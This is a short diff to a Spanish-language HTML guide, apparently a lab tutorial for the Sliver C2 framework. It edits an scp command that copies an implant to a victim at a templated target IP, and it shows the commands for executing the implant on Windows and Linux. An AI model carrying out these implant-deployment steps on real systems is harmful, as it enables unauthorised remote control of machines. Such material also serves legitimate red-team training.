@@ -54,7 +54,7 @@ sliver > jobs        # verifica que el job esté activo</code></pre>
       </li>
       <li><strong>Transferir el implant</strong> a la víctima y ejecutarlo (ejemplos):
         <pre><code class="language-bash"># Desde Kali: scp/powershell/curl según plataforma
-      scp /home/kali/IMPLANT_NAME.exe admin@{{ target_ip }}:/tmp/
+      scp /home/kali/IMPLANT_NAME admin@{{ target_ip }}:/tmp/
       # En la víctima Windows (PowerShell):
       .\IMPLANT_NAME.exe
       # En Linux/Mac: subir binario y ejecutar: ./IMPLANT_NAME</code></pre>
